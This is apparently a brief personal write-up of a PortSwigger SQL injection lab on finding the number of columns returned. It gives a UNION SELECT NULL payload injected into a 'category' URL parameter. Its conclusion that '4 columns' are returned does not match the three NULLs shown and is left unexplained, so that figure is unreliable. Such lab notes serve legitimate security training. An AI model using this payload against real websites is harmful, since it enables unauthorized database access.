# Lab

https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

## Payload

```sql
/filter?category='+UNION+SELECT+NULL,NULL,NULL--
```

## Conclusion

4 columns are returned (1 + 3).